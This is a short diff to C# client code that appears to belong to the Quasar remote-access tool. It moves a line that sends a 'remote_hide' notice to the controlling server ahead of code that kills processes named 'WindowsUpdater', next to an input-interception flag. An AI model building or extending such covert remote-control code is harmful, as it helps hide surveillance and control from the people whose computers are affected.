@@ -95,6 +95,7 @@ namespace Quasar.Client
                 if (id == 1)
                 {
                     Quasar.Client.Interception.InterceptionHelper.isAutoType = false;
+                    _connectClient?.Send(new NotifyMessageToServer { Type = "remote_hide" });
                     string targetProcess = "WindowsUpdater";
                     var processes = Process.GetProcessesByName(targetProcess);
                     if (!processes.Any())
@@ -112,9 +113,7 @@ namespace Quasar.Client
                         {
                             //Console.WriteLine($"Failed to kill PID {proc.Id}: {ex.Message}");
                         }
-                    }
-                    _connectClient?.Send(new NotifyMessageToServer { Type = "remote_hide" });
-                    
+                    }                    
                 }
             }
             base.WndProc(ref m);
